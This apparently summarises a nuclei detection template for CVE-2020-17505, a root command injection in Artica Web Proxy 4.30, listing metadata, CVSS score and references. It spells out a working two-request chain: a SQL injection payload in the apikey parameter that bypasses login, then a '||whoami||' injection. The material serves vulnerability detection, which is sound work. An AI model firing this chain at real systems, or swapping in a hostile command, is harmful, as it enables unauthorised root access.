---
cve_id: CVE-2020-17505
template_path: nuclei-templates/http/cves/2020/CVE-2020-17505.yaml
affected_product: Artica Web Proxy
severity: high
authentication: required
external_callback: false
affected_versions: 4.30
preconditions: []
poc_classification: rce
---

## Vulnerability
Artica Web Proxy 4.30 allows an authenticated remote attacker to inject OS commands via the `service-cmds` parameter in `cyrus.php` (accessed as `service-cmds-peform`). Injected commands are executed with root privileges via `service_cmds_peform`.

CVSS v3.1: 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)  
CWE-78 (OS Command Injection)  
Successful exploitation results in full remote code execution as root, compromising confidentiality, integrity, and availability of the system.

## PoC / Detection
Classification: rce

The template executes a two-step raw HTTP chain to detect/verify:  
1. GET `/fw.login.php?apikey=%27UNION%20select%201,%27YToyOntzOjM6InVpZCI7czo0OiItMTAwIjtzOjIyOiJBQ1RJVkVfRElSRUNUT1JZX0lOREVYIjtzOjE6IjEiO30=%27;` (UNION SELECT payload establishes admin session).  
2. GET `/cyrus.index.php?service-cmds-peform=%7C%7Cwhoami%7C%7C` (injects harmless `whoami` command).  

Matchers require HTTP 200 and body containing all three strings: `array(2)`, `Position: ||whoami||`, `root`.

## References
- http://packetstormsecurity.com/files/159267/Artica-Proxy-4.30.000000-Authentication-Bypass-Command-Injection.html
- https://nvd.nist.gov/vuln/detail/CVE-2020-17505
- https://blog.max0x4141.com/post/artica_proxy/
- https://github.com/sobinge/nuclei-templates
- https://github.com/ARPSyndicate/kenzer-templates
